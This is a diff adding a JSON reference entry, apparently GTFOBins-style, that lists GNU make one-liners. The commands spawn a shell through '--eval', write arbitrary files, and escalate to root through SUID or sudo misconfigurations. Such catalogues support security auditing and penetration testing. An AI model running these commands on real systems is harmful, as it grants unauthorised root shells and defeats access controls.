@@ -1,0 +1,26 @@
+{
+  "description": "All these examples only work with GNU 'make' due to the lack of support of the '--eval' flag. The same can be achieved by using a proper 'Makefile' or by passing the content via stdin using '-f -'.",
+  "functions": {
+    "shell": [
+      {
+        "code": "make -s --eval=$'x:\\n\\t-'\"/bin/sh\"\n"
+      }
+    ],
+    "file-write": [
+      {
+        "description": "Requires a newer GNU 'make' version.",
+        "code": "make -s --eval=\"\\$(file >[file],DATA)\" .\n"
+      }
+    ],
+    "suid": [
+      {
+        "code": "./make -s --eval=$'x:\\n\\t-'\"/bin/sh -p\"\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "sudo make -s --eval=$'x:\\n\\t-'\"/bin/sh\"\n"
+      }
+    ]
+  }
+}
